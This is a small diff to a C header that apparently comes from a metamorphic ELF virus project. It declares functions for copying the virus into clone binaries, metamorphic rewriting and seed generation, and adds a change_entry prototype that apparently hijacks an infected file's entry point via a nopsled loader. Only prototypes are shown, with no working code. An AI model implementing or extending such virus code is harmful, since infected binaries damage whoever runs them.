@@ -53,6 +53,7 @@ bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, 
 bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *file_entry, const struct virus_header *vhdr);
 bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off, uint64_t seed, size_t *full_virus_size, const struct virus_header *vhdr);
 bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);
+bool		change_entry(struct safe_ptr clone_ref, const struct entry *file_entry, size_t dist_nopsled_loader, size_t dist_client_loader);
 
 /*
 ** elf iterators
